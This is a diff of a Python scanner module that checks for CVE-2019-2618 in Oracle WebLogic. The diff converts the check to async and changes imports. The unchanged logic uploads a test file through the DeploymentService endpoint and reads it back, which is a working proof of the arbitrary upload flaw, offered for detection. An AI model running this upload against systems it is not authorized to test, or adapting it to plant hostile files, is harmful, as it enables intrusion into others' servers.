@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_useragent
+from app.lib.common import get_useragent
+from app.lib.request import request
 
 class CVE_2019_2618_BaseVerify:
     def __init__(self, url):
@@ -28,7 +28,7 @@ class CVE_2019_2618_BaseVerify:
             'cache-control': "no-cache"
         }
     
-    def check(self):
+    async def check(self):
         
         """
         检测是否存在漏洞
@@ -42,15 +42,12 @@ class CVE_2019_2618_BaseVerify:
             check_data = 'This is a Test'
             payload = "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"check.txt\"; filename=\"check.txt\"\r\nContent-Type: false\r\n\r\n %s \r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--" % (check_data)
             payload_url = self.url + "/bea_wls_deployment_internal/DeploymentService"
-            result = request.post(payload_url, headers = self.headers, data = payload)
-            check = request.get(self.url +"/bea_wls_deployment_internal/check.txt")
-            if check.status_code == 200 and 'This is a Test' in check.text:
+            result = await request.post(payload_url, headers = self.headers, data = payload)
+            check = await request.get(self.url +"/bea_wls_deployment_internal/check.txt")
+            if check.status == 200 and 'This is a Test' in await check.text():
                 return True
-            else:
-                return False
         except Exception as e:
-            return False, e
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
